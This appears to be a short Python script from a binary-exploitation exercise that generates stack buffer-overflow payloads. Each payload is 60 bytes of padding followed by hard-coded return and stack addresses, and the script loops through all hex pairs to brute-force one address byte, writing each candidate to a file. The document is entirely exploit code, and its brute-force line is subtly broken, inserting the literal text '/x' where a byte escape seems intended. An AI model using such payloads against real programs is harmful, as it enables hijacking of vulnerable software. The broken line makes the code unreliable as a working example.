# payload = "1"*60 + "\x00\xce\xff\xff" + "\x70\xef\x04\x08" + "\x70\xe4\x04\x08" + "\x68\xb7\x0b\x08"
payload = "A" * 60 + "\x78\xce\xff\xff" + "\x70\xef\x04\x08" + "\xbd\xd1\xff\xff" + "\x68\xb7\x0b\x08" + "\x70\xe4\x04\x08"
a = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']
for i in a:
    for j in a:
        payload = "A" * 60 + "\x78\xce\xff\xff" + "\x70\xef\x04\x08" + """/x""" + f"{i}{j}\xd1\xff\xff" + "\x68\xb7\x0b\x08" + "\x70\xe4\x04\x08"
        f = open(f"./els/el{i}{j}", "w")
        f.write(payload)
        f.close()
